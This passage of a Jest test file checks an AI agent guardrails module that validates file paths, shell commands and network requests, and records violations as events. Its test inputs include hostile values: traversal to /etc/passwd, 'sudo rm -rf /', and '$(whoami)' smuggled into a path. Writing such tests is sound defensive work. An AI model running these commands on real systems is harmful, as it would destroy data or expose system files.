    describe('validateAllPass', () => {
      it('should return allowed true when all pass', () => {
        const { allowed, results } = guardrails.validateAllPass({
          path: 'workspace/file.txt',
          command: 'ls -la',
        }, agentId);

        expect(allowed).toBe(true);
        expect(results.length).toBe(2);
      });

      it('should return allowed false when any fails', () => {
        const { allowed, results } = guardrails.validateAllPass({
          path: '../../../etc/passwd',
          command: 'ls -la',
        }, agentId);

        expect(allowed).toBe(false);
        expect(results.length).toBe(2);
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // EDGE CASES & ERROR HANDLING
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Edge Cases and Error Handling', () => {
    const agentId = 'test-agent-9';

    describe('Empty and Null Input', () => {
      it('should handle empty path', () => {
        const result = guardrails.validatePath('', agentId);
        
        expect(result.allowed).toBe(true); // Empty path is technically valid
      });

      it('should handle empty command', () => {
        const result = guardrails.validateCommand('', agentId);
        
        // Should pass as there's no blocked command or pattern
        expect(result.allowed).toBe(true);
      });

      it('should handle whitespace-only command', () => {
        const result = guardrails.validateCommand('   ', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });

    describe('Disabled Guardrails', () => {
      it('should allow all when disabled', () => {
        const disabledGuardrails = createGuardrails({ enabled: false });

        const pathResult = disabledGuardrails.validatePath('../../../etc/passwd', agentId);
        const cmdResult = disabledGuardrails.validateCommand('sudo rm -rf /', agentId);
        const netResult = disabledGuardrails.validateNetworkRequest('ftp://localhost', agentId);

        expect(pathResult.allowed).toBe(true);
        expect(cmdResult.allowed).toBe(true);
        expect(netResult.allowed).toBe(true);
        expect(pathResult.message).toContain('disabled');
      });
    });

    describe('Unicode and Special Characters', () => {
      it('should handle unicode in paths', () => {
        const result = guardrails.validatePath('workspace/文件.txt', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should handle spaces in paths', () => {
        const result = guardrails.validatePath('workspace/my file.txt', agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should handle special characters in paths', () => {
        const result = guardrails.validatePath('workspace/file-name_v2.0.txt', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });

    describe('Very Long Input', () => {
      it('should handle very long path', () => {
        const longPath = 'workspace/' + 'subdir/'.repeat(100) + 'file.txt';
        const result = guardrails.validatePath(longPath, agentId);
        
        expect(result.allowed).toBe(true);
      });

      it('should handle very long command (blocked by length)', () => {
        const longCommand = 'echo ' + 'a'.repeat(5000);
        const result = guardrails.validateCommand(longCommand, agentId);
        
        expect(result.allowed).toBe(false);
      });
    });

    describe('Complex Nested Attacks', () => {
      it('should detect traversal in command arguments', () => {
        const result = guardrails.validateCommand('cat ../../../etc/passwd', agentId);
        
        // The command itself is allowed, but this tests that we check patterns
        expect(result.allowed).toBe(true); // cat is allowed, no patterns match
      });

      it('should detect command in path', () => {
        const result = guardrails.validatePath('workspace/$(whoami)', agentId);
        
        // $() pattern should be detected
        expect(result.allowed).toBe(false);
      });
    });

    describe('Case Sensitivity', () => {
      it('should handle uppercase commands', () => {
        const result = guardrails.validateCommand('LS -la', agentId);
        
        // Command extraction gets 'LS' which is not in allowed list
        expect(result.allowed).toBe(false);
      });

      it('should handle mixed case paths', () => {
        const result = guardrails.validatePath('WORKSPACE/File.TXT', agentId);
        
        expect(result.allowed).toBe(true);
      });
    });

    describe('Team ID Handling', () => {
      it('should work without teamId', () => {
        const result = guardrails.validatePath('../../../etc/passwd', agentId);
        
        expect(result.allowed).toBe(false);
      });

      it('should include teamId in violation', () => {
        guardrails.validatePath('../../../etc/passwd', agentId, 'team-123');
        const violations = guardrails.getViolations(agentId);
        
        expect(violations[0].teamId).toBe('team-123');
      });
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // EVENT EMITTER FUNCTIONALITY
  // ═══════════════════════════════════════════════════════════════════════════

  describe('Event Emitter Functionality', () => {
    const agentId = 'test-agent-10';

    it('should emit violation event', (done) => {
      guardrails.on('violation', (violation: SecurityViolation) => {
        expect(violation.agentId).toBe(agentId);
        expect(violation.type).toBe('path_traversal');
        done();
      });

      guardrails.validatePath('../../../etc/passwd', agentId);
    });

    it('should support multiple listeners', () => {
      const listener1 = jest.fn();
      const listener2 = jest.fn();

      guardrails.on('violation', listener1);
      guardrails.on('violation', listener2);

      guardrails.validatePath('../../../etc/passwd', agentId);

      expect(listener1).toHaveBeenCalled();
      expect(listener2).toHaveBeenCalled();
    });

    it('should support once listener', () => {
      const listener = jest.fn();

      guardrails.once('violation', listener);

      guardrails.validatePath('../../../etc/passwd', agentId);
      guardrails.validatePath('/etc/passwd', agentId);

      expect(listener).toHaveBeenCalledTimes(1);
    });

    it('should support removeListener', () => {
      const listener = jest.fn();

      guardrails.on('violation', listener);
      guardrails.removeListener('violation', listener);

      guardrails.validatePath('../../../etc/passwd', agentId);

      expect(listener).not.toHaveBeenCalled();
    });
  });
});
